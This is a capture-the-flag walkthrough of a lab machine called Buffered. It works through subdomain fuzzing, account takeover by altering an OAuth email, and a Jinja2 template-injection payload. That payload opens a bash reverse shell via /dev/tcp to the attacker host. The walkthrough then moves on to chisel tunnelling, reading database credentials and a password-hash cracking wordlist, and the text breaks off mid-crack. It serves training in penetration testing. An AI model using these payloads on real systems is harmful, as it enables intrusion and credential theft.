![Screenshot](/hard/Buffered/Images/machine.png)

Difficulty: **Hard**

Made by: **rxffsec**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 👤 [Lateral Movement Christine](#lateral-movement-christine)
* 👤 [Lateral Movement Tyler](#lateral-movement-tyler)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

## 🛠️  Techniques: Enumeration of users, fuzzing with FFUF, ATO with manipulation of requests with caido, SSTI (Python jinja2), escape a rbash, Port Forwarding with chisel, analyze script of python, brute force with john, LFI and view content from a script of python, Exploit the library pickle python and gain RCE, Analyze a compiled binary with GDB, Exploit a BoF with shellcodes, Analyze another compiled binary with GDB and Ghidra, Exploit a BoF with ret2plt and escalate privileges.

---

First of all we make sure the machine is up, we can check it quickly with the command **ping**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.149 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.133 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.129 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2048ms
rtt min/avg/max/mdev = 0.129/0.137/0.149/0.008 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

First of all we start our reconnaissance always with **nmap** to know what ports are open in the target machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 15:48 -0500
Initiating ARP Ping Scan at 15:48
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:48, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:48
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:48, 2.73s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000026s latency).
Scanned at 2026-01-17 15:48:14 -05 for 3s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.17 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

When the scan concludes we can see that only the port 80 (http / Hyper-Text Transfer Protocol) is open, to get more information of this port we can do another scan with **nmap** to know what services and versions are using this port.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ nmap -p80 -n -sCV 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-17 15:51 -0500
Nmap scan report for 172.17.0.2
Host is up (0.000096s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://buffered.dl/
|_http-server-header: nginx/1.24.0 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.08 seconds
```

**-p80** <- With this argument nmap will only scan this port that we discover before.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports, like versions.

We can see that the port 80 is a website, but is being redirect to a domain **buffered.dl**, this is virtual hosting so we need to enter this domain into the **/etc/hosts** file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ head -n 1 /etc/hosts
172.17.0.2      buffered.dl
```

Okay, we can use **whatweb** to know what technologies are being used into this domain.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ whatweb http://buffered.dl
http://buffered.dl [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[christine@buffered.dl,info@buffered.dl,support@buffered.dl,tyler@buffered.dl,wilson@buffered.dl], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[172.17.0.2], Lightbox, Script[application/json], Title[Buffered], nginx[1.24.0]
```

And we can see a lot of information, we can see a lot of emails and also is using nginx, bootstrap, etc.

We need to save this emails, sometimes can be very useful this information.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ cat emails 
christine@buffered.dl
info@buffered.dl
support@buffered.dl
tyler@buffered.dl
wilson@buffered.dl
```

Okay, let's take a look into the website with our browser.

![Screenshot](/hard/Buffered/Images/image1.png)

We can see a lot of information in this website, but nothing is useful here, we can see this possible users that are in the system:

![Screenshot](/hard/Buffered/Images/image2.png)

We can save the name of this users, all of this information can be useful for later.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ cat users 
tyler
christine
wilson
tyler miller
christine ross
wilson winters
```

After a long time trying is something is functional is in this website but we can't find nothing.

We can use fuzzing to find possible **subdomains** on this website with **FFUF**

---
# Enumeration

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ ffuf -H 'host: FUZZ.buffered.dl' -u http://buffered.dl -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c -ic -fl 816

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://buffered.dl
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.buffered.dl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 816
________________________________________________

dashboard               [Status: 200, Size: 5666, Words: 1744, Lines: 129, Duration: 6713ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

So we are going to Fuzz the header of host.

And we can found that exists a subdomain **dashboard**, so we need to enter also this subdomain into the **/etc/hosts** file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ head -n1 /etc/hosts
172.17.0.2      buffered.dl dashboard.buffered.dl
```

Okay let's take a look into the website with this subdomain with **whatweb**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ whatweb http://dashboard.buffered.dl
http://dashboard.buffered.dl [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[172.17.0.2], JQuery[1.10.2], Lightbox, Modernizr, PasswordField[password], Script, Title[Buffered Dashboard], X-UA-Compatible[ie=edge], nginx[1.24.0]
```

We can see that is using **JQuery** in particular this version is very old and vulnerable to multiple exploits, but in this case we are not going to exploit this.

Let's take a view with our browser then.

![Screenshot](/hard/Buffered/Images/image3.png)

And we can see this, in this website we can create an account, so im going to make one.

Okay so once we create our account we can see 2 logins, OAuth login and a normal sign in.

So im going to login with the normal one.

![Screenshot](/hard/Buffered/Images/image4.png)

And we can see this, and nothing else interesting.

---
# Exploitation website

After looking a while, I found something interesting in the OAuth login.

![Screenshot](/hard/Buffered/Images/image5.png)

We can see that in the method are getting the email and the token, what if we change it that email for example admin?

After trying multiple times the email of admin is ```admin@buffered.dl```

![Screenshot](/hard/Buffered/Images/image6.png)

And we can see that we are being redirected into the dashboard of admin!

![Screenshot](/hard/Buffered/Images/image7.png)

And we are in as admin!

In this dashboard we can see that we found multiple things that are interesting, we can add content into a list.

After trying multiple things like exploit a SQLI, No-SQLI, XSS and all of that, we found something interesting here in the **search** bar.

![Screenshot](/hard/Buffered/Images/image8.png)

When we enter this payload ```{{7*7}}``` The result of ID is 49, this mean we are seeing a possible exploitation of a **SSTI** (Server-Side Template Injection), this vulnerability can lead into a **LFI** (Local File Inclusion) or even a **RCE** (Remote Command Execution).

But exists multiple technologies that can be vulnerable to this, like python, java, django and others.

You can try multiple payloads to find what Template is using on this website you can take a look [here](https://example.com)

In this case this Template is from python and is using **Jinja2**.

![Screenshot](/hard/Buffered/Images/image9.png)

So we can use the next payload:

- ```{{cycler.__init__.__globals__.os.popen('command here').read()}}```

With this payload we can execute commands on the system (RCE)

![Screenshot](/hard/Buffered/Images/image10.png)

But when we execute certain commands like **id** or **whoami** it show us the trollface.

We can see what kind of shell we are executing the commands.

![Screenshot](/hard/Buffered/Images/image11.png)

We see that we are in a **rbash** (restricted bash), this means that we can't execute some commands, but we can do it anyways, we just need to enter the full path of the command we want to execute.

I'm going to make a reverse shell, bash is located in **/usr/bin**

But before doing that we need to be in listen mode with **netcat** to receive the connection of the reverse shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Okay now we are listening to this port, okay so let's execute malicious command:

- ```{{cycler.__init__.__globals__.os.popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/1111 0>&1"').read()}}```

And we receive this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 35584
bash: cannot set terminal process group (369): Inappropriate ioctl for device
bash: no job control in this shell
bash: groups: command not found
bash: dircolors: command not found
wilson@aaed8527596a:~$ /bin/whoami
/bin/whoami
wilson
```

We are in!

## Modifying shell

So we need to modify this shell to operate more comfy with this.

So let's modify this shell because is very ugly, let's do a quick treatment then.

First of all we do this:

Since in this system the command **script** doesn't spawn bash so let's spawn a shell with **python3** and **pty**

```r
wilson@aaed8527596a:~$ /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
<bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
bash: groups: command not found
bash: dircolors: command not found
```

once we do this, let's suspend the process first with **CTRL + Z**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```r
/usr/bin/reset xterm
```

This are going to reset the terminal.

In this user the PATH is very limited, so we can't execute the commands that we want.

```r
wilson@aaed8527596a:~$ echo $PATH
/home/wilson/.local/bin
```

We can copy our PATH from our attack machine and define this new path to the user **Wilson**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ echo $PATH | xclip -sel clip
```

So we are copying the value of path to the clipboard.

```r
wilson@aaed8527596a:~$ export PATH=/run/user/1000/fnm_multishells/20798......
```

And we can finally execute commands without defining all the path of the command.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```r
wilson@aaed8527596a:~$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```r
wilson@aaed8527596a:~$ stty rows {num} columns {num}
```

and finally it looks way better!

---
# Lateral Movement Christine

In this system we have 3 users; **wilson**, **christine** and **tyler**, so we need to move across with these users, before escalating privileges.

In this system we can find ports that are open in the localhost of the target machine, this means that we couldn't see from the exterior with our attack machine.

```r
wilson@aaed8527596a:~$ ss -tuln
Netid                   State                    Recv-Q                   Send-Q                                      Local Address:Port                                        Peer Address:Port                   Process                   
tcp                     LISTEN                   0                        128                                             127.0.0.1:5000                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        1                                               127.0.0.1:9000                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        511                                               0.0.0.0:80                                               0.0.0.0:*                                                
tcp                     LISTEN                   0                        70                                              127.0.0.1:33060                                            0.0.0.0:*                                                
tcp                     LISTEN                   0                        128                                             127.0.0.1:5555                                             0.0.0.0:*                                                
tcp                     LISTEN                   0                        151                                             127.0.0.1:3306                                             0.0.0.0:* 
```

We see that are multiple ports open in this machine and that are the following ones:

- port 5000
- port 5555
- port 9000
- port 33060

So we need to use **chisel** to bring back these ports and access from our attack machine, basically port forwarding.

Okay so let's transfer chisel to download it in the target machine, then let's make a copy of **chisel** and make a server with **python**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ cp /usr/bin/chisel .
                                                                                
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

In the target machine it have **curl** so we can download chisel with it.

```r
wilson@aaed8527596a:/tmp$ curl http://172.17.0.1/chisel -O
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9.7M  100  9.7M    0     0  76.1M      0 --:--:-- --:--:-- --:--:-- 76.2M
```

Okay so let's make a chisel server with our attack machine to receive connections.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ chisel server --reverse -p 1234
2026/01/17 18:54:53 server: Reverse tunnelling enabled
2026/01/17 18:54:53 server: Fingerprint 0aS/Epm+/Z/Z6PkMyS6pNDMlWfzq83rnnPmXPmkhcsc=
2026/01/17 18:54:53 server: Listening on http://0.0.0.0:1234
```

Okay now with the target machine let's connect it to us.

```r
wilson@aaed8527596a:/tmp$ chmod +x chisel 
wilson@aaed8527596a:/tmp$ ./chisel client 172.17.0.1:1234 R:5000 R:5555 R:9000 R:33060 &
[1] 738
wilson@aaed8527596a:/tmp$ 2026/01/17 17:58:46 client: Connecting to ws://172.17.0.1:1234
2026/01/17 17:58:46 client: Connected (Latency 947.444µs)
```

With this basically we are making tunnels to get access into the ports that are open inside in the target machine, and we are making that this chisel session goes to the background, because we still need to interact and execute command with the user **wilson.**

And we receive this in the chisel server:

```r
2026/01/17 18:58:46 server: session#1: tun: proxy#R:5000=>5000: Listening
2026/01/17 18:58:46 server: session#1: tun: proxy#R:5555=>5555: Listening
2026/01/17 18:58:46 server: session#1: tun: proxy#R:9000=>9000: Listening
2026/01/17 18:58:46 server: session#1: tun: proxy#R:33060=>33060: Listening
```

We got access into these ports.

We can use **nmap** once again to find what services and versions are running into these ports.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ nmap -n -p5000,5555,9000,33060 -sCV 127.0.0.1 -oX reverse_ports
```

We are exporting all the information into a **XML** file.

I do this to make the output more readable into a **html** file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ xsltproc reverse_ports -o reverse_ports.html
```

Okay so let's open it.

 ```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ open reverse_ports.html
 ```

![Screenshot](/hard/Buffered/Images/image12.png)

As we can see is more pretty and readable to the sight.

And we can see that the port **5000** is the same as the website **dashboard.buffered.dl**

The port 33060 is a SQL server.

The interesting ones is the port 5555 it seems that is another website and the port 9000 it seems a application?

First let's connect into the port 9000 with **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ nc 127.0.0.1 9000
⠀⣁⠒⣠⣌⢓⡙⣿⣿⡁⠨⢉⣐⠢⣸⣿⣿⣿⣿⣾⣿⣷⣾⣿⣯⣿⣿⣿⣿⣇⠂⣂⡋⠥⠊⣿⣿⢏⡞⣫⣄⠐⢀⡀
⣠⣶⣿⣿⣿⠌⠷⠹⣿⡿⡠⢘⣫⣾⣿⣿⣿⡿⢛⣫⣭⡶⠶⣭⣍⡛⢿⣿⣿⣿⣿⣝⡁⢄⢺⣿⠿⠼⠅⣿⣿⣿⣶⣦
⣿⣿⣿⣿⡿⡘⣱⣟⡂⠜⣴⣿⣿⣿⣿⡿⣩⣎⣿⣟⢪⢇⡰⣗⣿⣿⣇⣌⠻⣿⣿⣿⣿⣦⠳⢒⣿⣎⢃⢿⣿⣿⣿⣿
⣿⣿⣿⣿⠣⠰⣾⡶⠉⣼⣿⣿⣿⣿⢏⣾⡿⢿⣿⣮⢘⣆⠱⡂⣵⣿⣿⢿⣷⡙⣿⣿⣿⣿⣧⠫⢶⣷⠆⠜⣿⣿⢿⣿
⢿⣯⣪⣿⡄⢘⣽⣭⡆⣿⣿⣿⣿⡟⣼⣿⣷⢾⠳⠟⣹⢿⡶⣿⠻⠾⣻⣿⣿⣧⢹⣿⣿⣿⣿⢸⣭⣯⡇⢢⣿⣯⢪⣿
⢌⢿⣿⣿⣷⡈⢵⢿⣗⡸⣿⣿⣿⡇⠛⣿⡓⠁⢀⣀⡀⠈⠉⠀⣀⡀⠀⢩⡟⠋⢸⣿⣿⣿⢇⣺⡿⡮⢁⣾⣿⣿⣿⢏
⠹⣆⡛⢿⣿⣿⡄⢋⡏⠷⣈⠻⣿⣷⡀⣿⠇⠀⢾⣿⡿⠀⠀⢸⣿⡿⠀⢸⡀⠀⣼⣿⠟⣁⡺⢩⣝⢠⣾⣿⣿⠟⣁⢮
⣄⠈⠊⣢⡼⡶⣶⣿⣧⣦⡁⢋⠖⡭⢡⠄⠞⠄⣄⠈⠀⠀⠀⠀⠈⣀⡄⠢⠁⡌⢭⡲⡝⠊⣠⣮⣿⣶⡶⡲⣤⡛⠊⠂
⣭⡅⢺⣿⣇⣁⣼⣿⣶⣿⣷⡀⠘⠀⢥⣄⠀⠀⠋⠀⢿⠀⠀⢾⠀⠸⠁⠀⡀⣘⡁⠁⢀⣾⣿⣷⣿⣿⣌⣁⣿⣿⠃⣬
⢛⣡⣟⣿⣿⣏⣎⣿⡿⢿⣯⣷⢹⣆⠉⠻⣯⣖⣤⠄⣈⣀⣀⣀⠠⣤⣲⣼⠟⠁⢠⡟⡼⣭⣿⢿⣿⣯⣏⣿⣿⣟⣧⣙
⣿⣻⣿⣿⣻⣟⣷⣿⣿⣷⣶⢸⢸⣿⣿⣆⡄⡉⠛⠻⠿⠹⠏⠽⠛⠛⢉⢠⣰⣶⣿⣇⠇⢶⣾⣿⣿⣿⣿⣿⣻⣿⣿⣻
⢯⣽⣾⡟⣿⣿⣻⠱⣥⢸⠀⢀⣺⣿⢿⣷⣕⣹⣾⣧⣴⣶⣶⣦⣴⣷⣯⣨⢾⣿⣿⣿⡄⠈⠉⢮⡷⡋⣿⣿⣟⢿⣿⣭
⠧⡞⠩⠅⣚⣛⠃⢐⣒⠠⠂⣬⣿⡿⠾⢷⣿⣿⣿⣿⡿⣟⣛⢿⣿⣿⣿⣿⣿⠷⢿⣿⡶⠐⠨⢒⡒⠑⢛⣛⡓⠭⢑⢢
⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠸⣿⣯⢪⣿⡵⣽⣿⣿⣽⡜⣾⣷⢱⢫⣿⣿⡟⡟⣽⣝⡞⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤
⣩⣉⣓⠻⠿⡖⠠⠄⠀⠀⠴⣿⣏⢮⣉⡵⣻⣿⣿⣿⣾⣢⣴⣪⣿⣿⣿⣧⡣⣙⡡⣣⣿⣆⠀⠀⠀⠤⠐⣲⠿⢛⣊⣉
⣛⣛⠺⢿⣶⡤⣀⠀⠀⠀⠈⢿⠟⣿⣶⣯⢿⣟⡻⠿⠭⠭⠭⠭⠿⠟⣻⡿⢵⣷⣿⠻⢻⠃⠀⠀⠀⢀⡠⢴⣾⠿⢒⣛
⡕⡪⢝⢶⡬⡉⠀⠀⠀⠀⠀⢀⡙⠏⠓⠈⣁⣀⣤⣤⣤⣤⣤⣤⣤⣀⣀⣈⠉⠚⠩⢟⡁⠀⢀⠀⠀⠁⠀⡩⣴⢾⡫⣕
        [ B u f f e r b o t ]
hello?

Message received
```

It seems is a program that listen into this port.

Now let's take a look into the website that is on the port **5555** first with **whatweb**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/enumeration]
└─$ whatweb http://localhost:5555
http://localhost:5555 [200 OK] Bootstrap, HTML5, HTTPServer[Werkzeug/3.0.1 Python/3.12.3], IP[::1], PasswordField[password], Python[3.12.3], Script, Title[Pages / Login - NiceAdmin Bootstrap Template], Werkzeug[3.0.1]
```

It seems that uses also Bootstrap and python.

Now with the browser.

![Screenshot](/hard/Buffered/Images/image13.png)

And we can see this, a login page.

After a long time trying to execute malicious payloads such as SQLI, SSTI and others, we are basically wasting time on this, and is the same when enumerating this with **gobuster**.

So we need to take a deeper look into the target machine with the user **wilson**.

In the home directory of the user **wilson**, we can find the script that is using the website, **app.py** and also a curious script **.pwgen.py**

```r
wilson@6f65e99ac74a:~$ ls -la dashboard/
total 36
drwxr-xr-x 4 wilson wilson  4096 Jul 31  2024 .
drwxr-x--- 1 wilson wilson  4096 Aug  2  2024 ..
-rw-rw-r-- 1 wilson wilson   496 Jul 31  2024 .pwgen.py
-rwxr-xr-x 1 wilson wilson 14594 Jul 31  2024 app.py
drwxr-xr-x 7 wilson wilson  4096 Jul 20  2024 static
drwxr-xr-x 3 wilson wilson  4096 Jul 30  2024 templates
```

First we are going to take a look into **pwgen.py**

```python
import random

def generate_password():
    first_name = input("Enter your first name: ")
    last_name = input("Enter your last name: ")
    password = f"{first_name[0].lower()}.{last_name.lower()}@buffered_"
    number = random.randint(0, 999999)
    formatted_number = f"{number:06d}" # add padding to the left; i.e. 000001
    password += formatted_number
    return password

# Generate the password
generated_password = generate_password()
print("Generated password:", generated_password)
```

And this is the code.

This script of python basically does this:

Grab the first name of a person, for example john, and grabs the first letter (j)

And grabs the last name of john, for example john doe (doe).

And with all of does make a single string: **j.doe@buffered_**

And lastly makes a random number with 6 digits, for example: **034691**

Then show us the final string and seems a generated password: **j.doe@buffered_034691**

If you remember, we have the names of the possible users of the system:

- Tyler miller
- Christine ross
- Wilson winters

And converted to passwords are just basically this:

- t.miller@buffered_464716
- c.ross@buffered_975046
- w.winters@buffered_897536

remember that the final number is generated randomly.

Even with this system we have a hint in the mail of the user wilson (**/var/mail/wilson**)

```r
wilson@6f65e99ac74a:/var/mail$ cat wilson 
from: christine
---
W. Winters

Your account was successfully registered!
Your default password is:

w.winters@buffered_945921

Please change it on your next login.

Site Admin
---
```

We can see that generates these passwords for his users.

if we take a look into app.py we can find credentials to the database of mysql.

```r
wilson@aaed8527596a:~/dashboard$ cat app.py | grep MYSQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'db_manager'
app.config['MYSQL_PASSWORD'] = 'Heig9At,'
app.config['MYSQL_DB'] = 'myflaskapp'
            host=app.config['MYSQL_HOST'],
            user=app.config['MYSQL_USER'],
            password=app.config['MYSQL_PASSWORD'],
            database=app.config['MYSQL_DB'],
```

We found the user and the password of this user.

So let's connect with this user to mysql and taking advantage that the user **wilson** is in the group of mysql.

```r
wilson@aaed8527596a:~/dashboard$ id
uid=1003(wilson) gid=1003(wilson) groups=1003(wilson),101(mysql)
```

Okay let's login then.

```r
wilson@aaed8527596a:~/dashboard$ mysql -h 127.0.0.1 -u db_manager -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 54
Server version: 8.0.39-0ubuntu0.24.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

And we are in, let's see what databases can we access.

```r
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| myflaskapp         |
| performance_schema |
+--------------------+
3 rows in set (0.29 sec)
```

Only **myflaskapp**, let's use it and see what tables are inside of it.

```r
mysql> use myflaskapp;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------------+
| Tables_in_myflaskapp |
+----------------------+
| infrastructure_list  |
| users                |
| users_old            |
+----------------------+
3 rows in set (0.00 sec)
```

We can see 3 tables here, the 1st one if you remember is when we add more content into the list on the admin dashboard.

And the 2 last tables are interesting we can have a look how many columns they have.

```r
mysql> describe users;
+----------+--------------+------+-----+---------+----------------+
| Field    | Type         | Null | Key | Default | Extra          |
+----------+--------------+------+-----+---------+----------------+
| id       | int          | NO   | PRI | NULL    | auto_increment |
| email    | varchar(100) | NO   |     | NULL    |                |
| password | varchar(100) | NO   |     | NULL    |                |
| role     | varchar(20)  | NO   |     | user    |                |
+----------+--------------+------+-----+---------+----------------+
4 rows in set (0.54 sec)

mysql> describe users_old;
+----------+--------------+------+-----+---------+-------+
| Field    | Type         | Null | Key | Default | Extra |
+----------+--------------+------+-----+---------+-------+
| id       | int          | NO   |     | 0       |       |
| email    | varchar(100) | NO   |     | NULL    |       |
| password | varchar(100) | NO   |     | NULL    |       |
| role     | varchar(20)  | NO   |     | user    |       |
+----------+--------------+------+-----+---------+-------+
4 rows in set (0.00 sec)
```

We can see that it seems very equal to each other.


```r
mysql> select * from users_old;
+----+-----------------------+--------------------------------------------------------------+-----------+
| id | email                 | password                                                     | role      |
+----+-----------------------+--------------------------------------------------------------+-----------+
|  1 | admin@buffered.dl     | $2y$10$r0547dSzx5IU3aMqifomSOxiksd18H9uw6jtUABG1gaXm4i536SWG | admin     |
|  2 | wilson@buffered.dl    | $2y$10$z2.Hbp46qdxtejA73XZyv.ScuBc4x79YytjeGpN8twSB2zFRdfrsq | support   |
|  3 | tyler@buffered.dl     | $2y$10$FJCGWarfD8uN8wX2ynyrLeBmPwFygBkV9DBt5A67RloYZFQkPeNDS | dev       |
|  4 | christine@buffered.dl | $2y$10$QYb/E/Rby6El2m4yfhfKf.eyX2.fz2zzNI8.xT8ihfwfKFT2WlDya | marketing |
+----+-----------------------+--------------------------------------------------------------+-----------+
4 rows in set (0.09 sec)

mysql> select * from users;
+----+--------------------+-------------------------------------------------------------------------------+-------+
| id | email              | password                                                                      | role  |
+----+--------------------+-------------------------------------------------------------------------------+-------+
|  1 | admin@buffered.dl  | $5$rounds=535000$gdgvlJGiCppSjhjF$qsbyr/0gt1jn6TFVSqBbNuT7V80L8Q1ZO2i/ncboW43 | admin |
|  9 | wilson@buffered.dl | $5$rounds=535000$bd4mhu.kst.nfzLt$WxIaokZfDMCPUV45.FoxJJZskGiEE3EEMLZB6jB5NZ9 | user  |
| 10 | craft@test.com     | $5$rounds=535000$ABXC2SxMZKO2uq2g$B14ZMVvRIYH1aTsNIXb63ekhS1pzMu3IxcbLD8kB68. | user  |
+----+--------------------+-------------------------------------------------------------------------------+-------+
3 rows in set (0.00 sec)
```


As we can see the normal table **users** is from the 1st website that we have seen before **dashboard.buffered.dl** where I created my user.

And the table users_old is new to us.

After a lot of tries to break these passwords I found one that can be broken.

And that is the password of the user **christine**, and how?

We have advantage of something, the password generator, because we have the first name and also the last name of **christine** (ross), we could create also a password generator that creates all the possible passwords for this user and break it with **john** and passing the hash.

So im going to make a password generator with python.

```python
from pwn import *
import signal, os, re

bar = log.progress("Generating...")

def stop(sig=False, frame=False):
    print()
    bar.failure("Proccess stopped.")
    log.warn("QUITTING")
    sys.exit(1)

signal.signal(signal.SIGINT, stop)

def start(user):
    file = f"../files/all_possible_pass_{user}"
    number = 0

    if os.path.exists(file):
        with open(file) as f:
            last = f.readlines()[-1]
            number = re.findall(rf"{user}@buffered_(.*)", last)[0]
            log.info(f"Continuing, last saved password: {last}")

    for num in range(int(number) + 1, 1000000):
        num = f"{num:06d}"

        password = f"{user}@buffered_{num}"

        bar.status(f"Saving the pass: {password}")

        with open(file, "a") as f:
            f.write(f"{password}\n")

    bar.success("All the passwords have been saved.")

if __name__ == "__main__":
    user = str(input("[i] Enter the user (e.g, j.doe): ")).strip()
    if not user: stop()

    start(user)
```

So this python script we enter the user and automatically generates all the possible passwords.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/exploits]
└─$ python3 generator.py 
[+] Generating...: All the passwords have been saved.
[i] Enter the user (e.g, j.doe): c.ross
```

Okay so we have all the possible passwords, now let's break the hash of the user **christine**, from the table users_old with **john**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/buffered/files]
└─$ john --wordlist=all_possible_pass_c.ross hash_christine
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
